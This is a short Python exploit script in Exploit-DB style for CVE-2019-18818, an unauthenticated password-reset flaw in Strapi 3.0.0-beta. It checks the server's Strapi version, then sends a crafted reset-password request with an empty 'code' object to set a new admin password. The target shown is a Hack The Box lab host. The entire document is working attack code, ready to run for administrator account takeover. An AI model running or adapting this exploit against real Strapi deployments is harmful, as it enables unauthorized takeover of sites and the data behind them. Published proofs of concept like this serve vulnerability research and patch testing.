# Exploit Title: Strapi 3.0.0-beta - Set Password (Unauthenticated)
# Date: 2021-08-29
# Exploit Author: David Anglada [CodiObert]
# Vendor Homepage: https://strapi.io/
# Version: 3.0.0-beta
# Tested on: Linux
# CVE: CVE-2019-18818

#!/usr/bin/python

import requests
import sys
import json

userEmail = "mysuperemail@gmail.com"
strapiUrl = "http://api-prod.horizontall.htb"
newPassword = "prova"

s = requests.Session()

proxies = {
    "http": "http://127.0.0.1:8080"
}

# Get strapi version
strapiVersion = json.loads(s.get("{}/admin/strapiVersion".format(strapiUrl), proxies=proxies).text)

print("[*] strapi version: {}".format(strapiVersion["strapiVersion"]))

# Validate vulnerable version
if strapiVersion["strapiVersion"].startswith('3.0.0-beta') or strapiVersion["strapiVersion"].startswith('3.0.0-alpha'):
	# Set new password
	print("[*] Setting new password")
	exploit={"code":{}, "password":newPassword, "passwordConfirmation":newPassword}
	r=s.post("{}/admin/auth/reset-password".format(strapiUrl), json=exploit, proxies=proxies)

	# Check if the password has changed
	if "username" in str(r.content):
		print("[+] New password '{}' set for user admin@horizontall.htb".format(newPassword))
	else:
		print("\033[91m[-] Something went wrong\033[0m")
		sys.exit(1)
else:
	print("\033[91m[-] This version is not vulnerable\033[0m")
	sys.exit(1)
